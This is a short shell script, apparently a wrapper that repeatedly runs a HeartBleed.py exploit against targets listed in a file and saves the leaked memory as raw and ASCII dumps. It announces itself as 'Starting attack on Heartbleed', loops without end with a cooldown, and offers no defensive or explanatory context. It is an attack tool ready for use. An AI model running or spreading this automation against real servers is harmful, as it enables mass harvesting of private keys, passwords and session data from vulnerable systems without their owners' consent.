./config.sh
export time=5
echo "$0 : Starting attack on Heartbleed ..."
echo "Target file : $BLEED_TARGET_FILE"
echo "Cooldown : $BLEED_COOLDOWN seconds"
while :
do
echo "Scanning ... (no logs here)"
python HeartBleed.py -f "$BLEED_TARGET_FILE" -n $time -r $BLEED_RAW_FILE -a $BLEED_ASCII_FILE -v >> $BLEED_VERBOSE_FILE
echo "Done !"
sleep 1
echo "Cooldown -> $BLEED_COOLDOWN seconds ..."
sleep $BLEED_COOLDOWN
done
